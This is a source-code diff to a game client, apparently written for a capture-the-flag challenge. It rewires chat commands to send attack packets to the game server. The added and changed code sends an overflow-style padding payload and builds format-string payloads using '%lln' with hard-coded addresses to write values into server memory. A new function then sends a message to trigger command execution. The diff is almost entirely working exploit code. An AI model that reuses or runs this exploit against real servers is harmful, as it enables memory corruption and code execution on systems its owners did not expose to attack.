@@ -275,6 +275,7 @@ void egk_putint(packetbuf &p, int val)
     p.put(val >> 24);
 }
 
+#include <sstream>
 void send_payload()
 {
     std::string padding(0xad, 'G');
@@ -287,10 +288,9 @@ void send_payload()
     sendpackettoserv(1, p.finalize());
 }
 
-#include <sstream>
 void write_address()
 {
-    unsigned long long address = 0x1337;
+    unsigned long long address = 0x446290;
     std::stringstream format;
     format << "hello%" << std::to_string(address - 0x9) << "x%145$lln";
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
@@ -301,7 +301,7 @@ void write_address()
 
 void write_value()
 {
-    unsigned long long value = 0x7331;
+    unsigned long long value = 0x430df4;
     std::stringstream format;
     format << "world%" << std::to_string(value - 0x9) << "x%238$lln";
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
@@ -310,15 +310,26 @@ void write_value()
     sendpackettoserv(1, p.finalize());
 }
 
+void run_command()
+{
+    char cmd[] = "hello";
+    packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
+    putint(p, SV_TEXTME);
+    sendstring(cmd, p);
+    sendpackettoserv(1, p.finalize());
+}
+
 void toserver(char *text)
 {
     if (!strcmp(text, "a"))
         send_payload();
-    if (!strcmp(text, "b"))
+    else if (!strcmp(text, "b"))
         write_address();
-    if (!strcmp(text, "c"))
+    else if (!strcmp(text, "c"))
         write_value();
-    // _toserver(text, SV_TEXT, SV_TEAMTEXT);
+    else if (!strcmp(text, "d"))
+        run_command();
+    // _toserver(cmd, SV_TEXT, SV_TEAMTEXT);
 }
 
 void toserverme(char *text)
